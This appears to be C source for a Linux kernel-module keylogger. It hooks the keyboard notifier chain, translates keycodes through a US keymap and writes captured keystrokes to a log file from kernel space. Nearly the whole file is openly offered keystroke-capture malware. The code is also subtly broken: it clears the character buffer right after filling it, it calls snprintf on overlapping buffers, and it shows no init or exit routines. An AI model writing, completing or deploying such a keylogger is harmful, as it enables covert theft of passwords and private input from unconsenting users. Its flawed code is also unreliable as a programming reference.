#include <linux/module.h>
#include <linux/init.h>
#include <linux/keyboard.h>
#include <linux/notifier.h>
#include <linux/input.h>
#include <linux/fs.h>
#include <linux/file.h>

#include "includes/headers.h"

/*
    Helpful sources:
        https://medium.com/@emanuele.santini.88/developing-a-linux-kernel-module-keylogger-6c3922d72f9d
*/
MODULE_LICENSE("GPL");
MODULE_AUTHOR("wizarddos");
MODULE_DESCRIPTION("Simple kernel-mode Keylogger");


char queued_chars[MAX_SIZE] = {0}; // Buffer to store queued characters
const char *us_keymap[][2] = {
    {"\0", "\0"}, {"_ESC_", "_ESC_"}, {"1", "!"}, {"2", "@"},       // 0-3
    {"3", "#"}, {"4", "$"}, {"5", "%"}, {"6", "^"},                 // 4-7
    {"7", "&"}, {"8", "*"}, {"9", "("}, {"0", ")"},                 // 8-11
    {"-", "_"}, {"=", "+"}, {"_BACKSPACE_", "_BACKSPACE_"},         // 12-14
    {"_TAB_", "_TAB_"}, {"q", "Q"}, {"w", "W"}, {"e", "E"}, {"r", "R"},
    {"t", "T"}, {"y", "Y"}, {"u", "U"}, {"i", "I"},                 // 20-23
    {"o", "O"}, {"p", "P"}, {"[", "{"}, {"]", "}"},                 // 24-27
    {"\n", "\n"}, {"_LCTRL_", "_LCTRL_"}, {"a", "A"}, {"s", "S"},   // 28-31
    {"d", "D"}, {"f", "F"}, {"g", "G"}, {"h", "H"},                 // 32-35
    {"j", "J"}, {"k", "K"}, {"l", "L"}, {";", ":"},                 // 36-39
    {"'", "\""}, {"`", "~"}, {"_LSHIFT_", "_LSHIFT_"}, {"\\", "|"}, // 40-43
    {"z", "Z"}, {"x", "X"}, {"c", "C"}, {"v", "V"},                 // 44-47
    {"b", "B"}, {"n", "N"}, {"m", "M"}, {",", "<"},                 // 48-51
    {".", ">"}, {"/", "?"}, {"_RSHIFT_", "_RSHIFT_"}, {"_PRTSCR_", "_KPD*_"},
    {"_LALT_", "_LALT_"}, {" ", " "}, {"_CAPS_", "_CAPS_"}, {"F1", "F1"},
    {"F2", "F2"}, {"F3", "F3"}, {"F4", "F4"}, {"F5", "F5"},         // 60-63
    {"F6", "F6"}, {"F7", "F7"}, {"F8", "F8"}, {"F9", "F9"},         // 64-67
    {"F10", "F10"}, {"_NUM_", "_NUM_"}, {"_SCROLL_", "_SCROLL_"},   // 68-70
    {"_KPD7_", "_HOME_"}, {"_KPD8_", "_UP_"}, {"_KPD9_", "_PGUP_"}, // 71-73
    {"-", "-"}, {"_KPD4_", "_LEFT_"}, {"_KPD5_", "_KPD5_"},         // 74-76
    {"_KPD6_", "_RIGHT_"}, {"+", "+"}, {"_KPD1_", "_END_"},         // 77-79
    {"_KPD2_", "_DOWN_"}, {"_KPD3_", "_PGDN"}, {"_KPD0_", "_INS_"}, // 80-82
    {"_KPD._", "_DEL_"}, {"_SYSRQ_", "_SYSRQ_"}, {"\0", "\0"},      // 83-85
    {"\0", "\0"}, {"F11", "F11"}, {"F12", "F12"}, {"\0", "\0"},     // 86-89
    {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},
    {"\0", "\0"}, {"_KPENTER_", "_KPENTER_"}, {"_RCTRL_", "_RCTRL_"}, {"/", "/"},
    {"_PRTSCR_", "_PRTSCR_"}, {"_RALT_", "_RALT_"}, {"\0", "\0"},   // 99-101
    {"_HOME_", "_HOME_"}, {"_UP_", "_UP_"}, {"_PGUP_", "_PGUP_"},   // 102-104
    {"_LEFT_", "_LEFT_"}, {"_RIGHT_", "_RIGHT_"}, {"_END_", "_END_"},
    {"_DOWN_", "_DOWN_"}, {"_PGDN", "_PGDN"}, {"_INS_", "_INS_"},   // 108-110
    {"_DEL_", "_DEL_"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},   // 111-114
    {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},         // 115-118
    {"_PAUSE_", "_PAUSE_"},                                         // 119
};

size_t resolve_keycode(int keycode, int is_shift, char *buffer, size_t buffer_size){
    memset(buffer, 0x0, buffer_size);
    
    if(keycode > KEY_RESERVED && keycode  <= KEY_PAUSE){
        const char *pressed_key = (is_shift == 1) ? us_keymap[keycode][1] : us_keymap[keycode][0];
        snprintf(buffer, buffer_size, "%s", pressed_key);
        return strlen(buffer);
    }

    return 0;
}

ssize_t write_to_file(char *buffer) {
	

    struct file *file;
    ssize_t ret = 0, len = 0;

    printk(KERN_DEBUG "Writing buffer %s", buffer);
    file = filp_open(FILE_PATH, O_RDWR | O_CREAT, 0644);
    if (IS_ERR(file)) {
        printk(KERN_DEBUG "Failed to open log file");
        return PTR_ERR(file);
    }

    len = kernel_write(file, buffer, strlen(buffer), &file->f_pos);
    if (len < 0) {
        printk(KERN_DEBUG "Failed to write into file: %zd", len);
        ret = len;
        goto finish;
    }

    printk(KERN_DEBUG "Saved %zd bytes to %s", len, FILE_PATH);
    ret = len;

finish:
    filp_close(file, NULL);
    return ret;
}


int keyboard_notifier_callback(struct notifier_block *nb, unsigned long action, void *nb_ptr) {
    /*
        *nb -> notifier_block struct
        action -> What keyboard is being recorded
        data -> pointer to nb
    */
    struct keyboard_notifier_param *keyboard_event = (struct keyboard_notifier_param *)nb_ptr; // Cast pointer to correct type
    
    char character_buff[BUFF_SIZE];

    size_t keystr_len = resolve_keycode(
        keyboard_event->value, 
        keyboard_event->shift, 
        character_buff, 
        BUFF_SIZE
    );
     memset(character_buff, 0x0, BUFF_SIZE);
     
    // Why down? This way we ommit showing a character 2 times
   
  if ((keystr_len >= 1) && !(keyboard_event->down)) {
        size_t curr_len = strlen(queued_chars);
        size_t new_len = strlen(character_buff);
        size_t total_needed = curr_len + 1 + new_len + 1;  // space + null terminator
    
        if (total_needed >= MAX_SIZE) {
            ssize_t return_val = write_to_file(queued_chars);
            if (return_val >= 0) {
                memset(queued_chars, 0, MAX_SIZE);
                snprintf(queued_chars, MAX_SIZE, "%s", character_buff);  // always re-add after flush
            }
        } else {
            snprintf(queued_chars, MAX_SIZE, "%s%s", queued_chars, character_buff);
        }
    }
    return NOTIFY_OK;
}

struct notifier_block nb = {
    .notifier_call = keyboard_notifier_callback
};

//TODO: Fix shitty makefile
